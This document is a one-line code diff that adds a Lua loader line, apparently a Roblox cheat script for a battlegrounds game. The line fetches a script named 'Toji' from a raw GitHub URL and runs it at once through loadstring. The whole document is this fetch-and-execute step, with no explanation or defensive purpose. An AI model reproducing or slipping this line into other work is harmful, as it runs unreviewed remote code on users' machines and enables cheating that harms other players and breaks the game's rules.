@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BronzeScripts/tsbg/refs/heads/main/Toji",true))()
